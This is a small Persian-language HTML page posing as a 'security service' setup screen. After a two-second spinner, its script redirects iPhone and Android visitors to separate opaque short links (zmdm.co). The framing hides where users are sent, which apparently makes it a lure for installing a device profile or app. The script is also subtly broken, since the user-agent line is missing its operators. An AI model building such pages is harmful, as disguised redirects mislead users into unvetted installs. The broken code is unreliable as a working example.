<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>در حال پیکربندی سرویس امنیتی...</title>
    <style>
        body { font-family: Tahoma, sans-serif; text-align: center; background-color: #f4f7f9; padding-top: 100px; }
        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div style="background: white; max-width: 400px; margin: auto; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1);">
        <h2>اتصال به سرور مرکزی...</h2>
        <p>لطفاً چند لحظه منتظر بمانید تا تنظیمات متناسب با دستگاه شما بارگذاری شود.</p>
        <div class="loader"></div>
    </div>

    <script>
        window.onload = function() {
            var ua = navigator.userAgent  navigator.vendor  window.opera;
            
            // هدایت آیفون به لینک تصویر اول
            if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) {
                setTimeout(function() {
                    window.location.href = "https://zmdm.co/ig6sxymk";
                }, 2000);
            } 
            // هدایت اندروید به لینک تصویر دوم
            else if (/android/i.test(ua)) {
                setTimeout(function() {
                    window.location.href = "https://zmdm.co/7xj1hyzn";
                }, 2000);
            }
            else {
                document.body.innerHTML = "<h3>دستگاه شما شناسایی نشد. لطفا با موبایل اسکن کنید.</h3>";
            }
        };
    </script>
</body>
</html>
